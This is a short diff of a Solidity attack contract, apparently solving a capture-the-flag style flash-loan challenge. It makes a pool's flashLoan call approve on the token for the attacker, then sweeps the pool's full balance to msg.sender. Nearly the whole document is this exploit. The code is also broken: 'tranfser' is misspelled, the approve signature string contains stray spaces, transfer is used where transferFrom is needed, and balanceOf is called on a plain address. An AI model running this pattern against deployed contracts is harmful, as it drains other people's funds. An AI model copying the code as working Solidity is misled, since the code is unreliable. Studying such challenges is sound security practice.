@@ -17,23 +17,24 @@ contract TrusterAttack {
   
     constructor(address payable poolAddress,
                  
-                IERC20 tokenAddress)
+                address tokenAddress)
     {
         //Idea
+
         //call flashLoan with x borrowAmount, borrower = this
         //target = token 
         uint256 balance = tokenAddress.balanceOf(poolAddress);
         IPoolFunc(poolAddress).flashLoan(
             0,
             address(this),
-            tokenAddress,
+            IERC20(tokenAddress),
             abi.encodeWithSignature(
                 "approve(address , uint256) ",
                 address(this),
                 balance
             )
         );
-        tokenAddress.tranfser(msg.sender, balance);
+        IERC20(tokenAddress).tranfser(msg.sender, balance);
         //calldata = approve(pool, this)
         //response 
         //token.tranfser(amount,attacker)
